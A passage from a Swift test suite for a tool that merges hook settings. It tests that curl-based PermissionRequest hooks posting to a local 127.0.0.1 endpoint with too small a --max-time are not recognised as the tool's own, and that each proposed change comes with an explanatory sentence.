                "uninstall could not recover the user's command from the repaired file")
    }

    // ---------------------------------------------------------- sub-floor rejection

    /// Sub-floor nominations are rejected: a `--max-time N` where `N - 5 <
    /// HoldBudget.floorSeconds` returns nil. Without this, a hand-crafted
    /// `--max-time 0` command read as the deck's own and skipped the
    /// candidate question.
    @Test("sub-floor --max-time nominations are rejected as not the deck's own")
    func subFloorNominationsAreRejected() {
        // `--max-time 12` means 7-second budget (12 - 5), below the 10-second
        // floor, so not the deck's.
        let subFloor = #"curl -s --max-time 12 -X POST --data-binary @- "http://127.0.0.1:8765/hook""#
        let document = JSONValue.object(["hooks": .object(["PermissionRequest": .array([.object([
            "matcher": .string("*"),
            "hooks": .array([.object(["type": .string("command"),
                                      "command": .string(subFloor)])]),
        ])])])])
        #expect(!SettingsMerge.isDeckHook(entries(document).first ?? .null),
                Comment(rawValue: "--max-time 12 (7 s) passed the deck-hook test"))
        #expect(reconcile(document).candidates.contains(subFloor),
                Comment(rawValue: "--max-time 12 was not surfaced as a candidate: "
                        + "\(reconcile(document).candidates)"))

        // `--max-time 0` yields a negative budget, also rejected.
        let zeroTime = #"curl -s --max-time 0 -X POST --data-binary @- "http://127.0.0.1:8765/hook""#
        let document2 = JSONValue.object(["hooks": .object(["PermissionRequest": .array([.object([
            "matcher": .string("*"),
            "hooks": .array([.object(["type": .string("command"),
                                      "command": .string(zeroTime)])]),
        ])])])])
        #expect(!SettingsMerge.isDeckHook(entries(document2).first ?? .null),
                Comment(rawValue: "--max-time 0 passed the deck-hook test"))
    }

    // ---------------------------------------------------------- what it says

    /// Every change is explained in words, not only in JSON. The diff is the
    /// proof; a person deciding whether to agree deserves the explanation.
    @Test("every change comes with a sentence")
    func changesAreExplained() {
        let result = reconcile(.object([:]))
        #expect(!result.steps.isEmpty)
        for step in result.steps {
            #expect(step.count > 12, Comment(rawValue: "a step says almost nothing: \(step)"))
        }
    }
}
